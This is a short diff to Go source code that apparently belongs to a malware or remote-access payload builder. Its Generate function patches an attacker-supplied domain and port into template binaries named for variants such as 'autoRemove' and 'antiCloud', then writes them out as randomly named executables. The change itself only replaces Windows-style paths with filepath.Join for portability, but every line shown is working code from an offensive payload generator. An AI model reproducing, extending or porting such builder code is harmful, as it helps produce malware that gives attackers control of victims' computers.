@@ -10,6 +10,7 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net"
+	"path/filepath"
 	"strings"
 	"time"
 	"unsafe"
@@ -423,15 +424,20 @@ func Generate(domain string,port string,version int)string  {
 	}
 	bPort := tlLoadFlag(port,len(portFlag))
 	if version==0{
-		path = "Server\\default.dat"
+		//path = "Server\\default.dat"
+		path = filepath.Join("Server","default.dat")
 	}else if version == 1{
-		path = "Server\\justRun.dat"
+		//path = "Server\\justRun.dat"
+		path = filepath.Join("Server","justRun.dat")
 	}else if version == 2{
-		path = "Server\\autoRemove.dat"
+		//path = "Server\\autoRemove.dat"
+		path = filepath.Join("Server","autoRemove.dat")
 	}else if version == 3{
-		path = "Server\\antiCloud.dat"
+		//path = "Server\\antiCloud.dat"
+		path = filepath.Join("Server","antiCloud.dat")
 	}else if version == 4{
-		path = "Server\\fill.dat"
+		//path = "Server\\fill.dat"
+		path = filepath.Join("Server","fill.dat")
 	}
 	fmt.Println("D:",len(bDomain),"P:",len(bPort),len(ipFlag),len(portFlag))
 	b, err := ioutil.ReadFile(path)
@@ -442,7 +448,7 @@ func Generate(domain string,port string,version int)string  {
 	b = bytes.Replace(b,[]byte(portFlag),bPort,len(bPort))
 	rand.Seed(time.Now().UnixNano())
 	Name:= tlRandStringRunes(4)+".exe"
-	err = ioutil.WriteFile("TEMP\\"+Name, b, 0777)
+	err = ioutil.WriteFile(filepath.Join("TEMP",Name), b, 0777)
 	if err != nil{
 		return ""
 	}
